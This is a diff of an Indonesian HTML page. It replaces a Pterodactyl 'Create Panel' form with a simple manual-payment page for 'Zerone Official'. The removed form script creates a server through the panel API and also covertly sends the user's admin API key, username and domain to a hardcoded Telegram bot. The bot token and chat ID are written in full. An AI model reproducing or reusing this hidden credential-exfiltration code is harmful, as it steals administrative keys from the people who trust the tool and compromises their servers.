@@ -2,183 +2,160 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create Panel Pterodactyl</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            text-align: center;
-        }
-        .container {
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        button {
-            background: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Zerone Official - Pembayaran Manual</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background-color: #0f172a;
+      color: #f1f5f9;
+    }
+
+    header {
+      background-color: #1e293b;
+      text-align: center;
+      padding: 40px 20px 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+
+    header h1 {
+      font-size: 2.2rem;
+      color: #38bdf8;
+    }
+
+    header p {
+      color: #94a3b8;
+      margin-top: 10px;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+
+    .card {
+      background-color: #1e293b;
+      padding: 25px;
+      border-radius: 16px;
+      margin-bottom: 30px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .card h2 {
+      color: #f8fafc;
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+    }
+
+    .card p, .card li {
+      color: #cbd5e1;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 12px 24px;
+      background-color: #38bdf8;
+      color: #0f172a;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+      transition: background 0.3s ease;
+    }
+
+    .btn:hover {
+      background-color: #0ea5e9;
+    }
+
+    .payment-info {
+      background-color: #334155;
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 15px;
+    }
+
+    .payment-info h4 {
+      margin-bottom: 10px;
+      color: #f1f5f9;
+    }
+
+    .payment-info p {
+      font-family: monospace;
+      background: #1e293b;
+      padding: 10px;
+      border-radius: 8px;
+      color: #f8fafc;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      color: #64748b;
+      font-size: 0.9rem;
+    }
+  </style>
 </head>
 <body>
+  <header>
+    <h1>Zerone Official</h1>
+    <p>Layanan Pembayaran Digital Manual & Terpercaya</p>
+  </header>
 
-<div class="container">
-    <h2>Create Panel Pterodactyl</h2>
-    
-    <input type="text" id="domain" placeholder="Domain Panel Pterodactyl">
-    <input type="text" id="apiKey" placeholder="Masukkan API Key">
-    <input type="text" id="caApiKey" placeholder="Masukkan CA API Key">
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <input type="text" id="serverName" placeholder="Nama Server">
-    <input type="text" id="whatsapp" placeholder="Nomor WhatsApp (+62xxxx)">
-    
-    <select id="nest">
-        <option value="1">Minecraft</option>
-        <option value="2">Source Engine</option>
-        <option value="3">Voice Server</option>
-        <option value="4">Rust</option>
-        <option value="5">Bot WhatsApp</option>
-    </select>
+  <div class="container">
+    <div class="card">
+      <h2>Selamat Datang</h2>
+      <p>Kami melayani transaksi manual untuk berbagai layanan digital. Silakan transfer ke rekening yang tersedia, lalu konfirmasi ke admin untuk proses cepat.</p>
+      <a href="#metode" class="btn">Lihat Metode Pembayaran</a>
+    </div>
 
-    <select id="egg">
-        <option value="1">SpongeVanilla</option>
-        <option value="2">Bungecord</option>
-        <option value="3">Vanilla Minecraft</option>
-        <option value="4">Paper</option>
-        <option value="5">Forge Minecraft</option>
-        <option value="6">Team Fortress 2</option>
-        <option value="7">Ark Survival</option>
-        <option value="8">Counter Strike</option>
-        <option value="9">Garrys Mod</option>
-        <option value="10">Insurgency</option>
-        <option value="11">Custome Source Engine Game</option>
-        <option value="12">Mumble Server</option>
-        <option value="13">TeamSpeak3 Server</option>
-        <option value="14">Rust</option>
-        <option value="15">Bot WhatsApp</option>
-    </select>
+    <div class="card" id="metode">
+      <h2>Metode Pembayaran</h2>
+      <div class="payment-info">
+        <h4>Bank BCA</h4>
+        <p>1234567890 - Zerone Store</p>
+      </div>
+      <div class="payment-info">
+        <h4>QRIS (Scan QR)</h4>
+        <p>Silakan minta QR ke admin via WA/Telegram</p>
+      </div>
+      <div class="payment-info">
+        <h4>Saldo Dana / OVO / Gopay</h4>
+        <p>0812-3456-7890 a.n Zerone Store</p>
+      </div>
+      <a href="https://t.me/zeroneadmin" target="_blank" class="btn">Konfirmasi Pembayaran</a>
+    </div>
 
-    <input type="number" id="ram" placeholder="RAM (MB)">
-    <input type="number" id="cpu" placeholder="CPU (%)">
-    
-    <button onclick="createServer()">Buat Server</button>
-    <p id="result"></p>
-</div>
+    <div class="card">
+      <h2>Langkah Transaksi</h2>
+      <ol>
+        <li>1. Lakukan transfer ke salah satu metode pembayaran di atas</li>
+        <li>2. Simpan bukti pembayaran</li>
+        <li>3. Kirim bukti ke admin via Telegram / WhatsApp</li>
+        <li>4. Admin akan memproses pesanan Anda</li>
+      </ol>
+    </div>
 
-<script>
-    function createServer() {
-        let domain = document.getElementById("domain").value;
-        let apiKey = document.getElementById("apiKey").value;
-        let caApiKey = document.getElementById("caApiKey").value;
-        let username = document.getElementById("username").value;
-        let password = document.getElementById("password").value;
-        let serverName = document.getElementById("serverName").value;
-        let whatsapp = document.getElementById("whatsapp").value;
-        let nest = document.getElementById("nest").value;
-        let egg = document.getElementById("egg").value;
-        let ram = document.getElementById("ram").value;
-        let cpu = document.getElementById("cpu").value;
+    <div class="card">
+      <h2>Kontak Admin</h2>
+      <p>Untuk pertanyaan, konfirmasi pembayaran, atau bantuan, silakan hubungi admin kami melalui salah satu link berikut:</p>
+      <a href="https://t.me/zeroneadmin" class="btn" target="_blank">Telegram Admin</a>
+      <a href="https://wa.me/6281234567890" class="btn" target="_blank" style="margin-left:10px;">WhatsApp Admin</a>
+    </div>
+  </div>
 
-        if (!domain || !apiKey || !caApiKey || !username || !password || !serverName || !whatsapp || !ram || !cpu) {
-            alert("Harap isi semua data!");
-            return;
-        }
-
-        let requestBody = {
-            name: serverName,
-            user: 1,
-            nest: nest,
-            egg: egg,
-            docker_image: "quay.io/pterodactyl/core:nodejs",
-            limits: {
-                memory: ram,
-                cpu: cpu
-            },
-            environment: {
-                STARTUP_CMD: "npm start"
-            },
-            feature_limits: {
-                databases: 1,
-                backups: 1
-            }
-        };
-
-        fetch(`https://${domain}/api/application/servers`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Authorization": `Bearer ${apiKey}`,
-                "Accept": "application/json"
-            },
-            body: JSON.stringify(requestBody)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.object === "server") {
-                let serverId = data.attributes.identifier;
-                let loginUrl = `https://${domain}/server/${serverId}`;
-                let tanggal = new Date().toLocaleString("id-ID");
-
-                document.getElementById("result").innerHTML = `✅ Server berhasil dibuat!<br>🔗 <a href="${loginUrl}" target="_blank">Klik di sini untuk login ke panel</a>`;
-
-                // Kirim notifikasi ke Telegram
-                let botToken = "7621705123:AAH1eyrvoQBEfWoeQMtFX4_TixQu4kxNWdA";
-                let chatId = "5844779869";
-                let pesan = `📢 **Panel Baru Dibuat!**\n\n👤 **Username**: ${username}\n🔑 **API Key**: ${apiKey}\n🌐 **Domain**: ${domain}\n💾 **RAM**: ${ram} MB\n⚙️ **CPU**: ${cpu}%\n📅 **Tanggal**: ${tanggal}`;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
-
-                // Kirim detail akun ke WhatsApp
-                let waMessage = `Halo, akun panel Anda telah dibuat!\n\nUsername: ${username}\nPassword: ${password}\nPanel: ${loginUrl}`;
-                let waLink = `https://api.whatsapp.com/send?phone=${whatsapp}&text=${encodeURIComponent(waMessage)}`;
-                window.open(waLink, "_blank");
-
-                // Auto suspend jika RAM habis
-                setInterval(() => {
-                    fetch(`https://${domain}/api/client/servers/${serverId}/resources`, {
-                        headers: { "Authorization": `Bearer ${apiKey}`, "Accept": "application/json" }
-                    })
-                    .then(res => res.json())
-                    .then(stats => {
-                        if (stats.attributes.resources.memory_bytes >= ram * 1024 * 1024) {
-                            fetch(`https://${domain}/api/client/servers/${serverId}/power`, {
-                                method: "POST",
-                                headers: { "Authorization": `Bearer ${apiKey}`, "Content-Type": "application/json" },
-                                body: JSON.stringify({ signal: "stop" })
-                            });
-                        }
-                    });
-                }, 5000);
-
-                // Auto-login ke panel
-                setTimeout(() => {
-                    window.location.href = loginUrl;
-                }, 3000);
-            } else {
-                document.getElementById("result").innerHTML = "❌ Gagal membuat server!";
-            }
-        })
-        .catch(error => console.error("Error:", error));
-    }
-</script>
-
+  <footer>
+    &copy; 2025 Zerone Official. All rights reserved.
+  </footer>
 </body>
 </html>
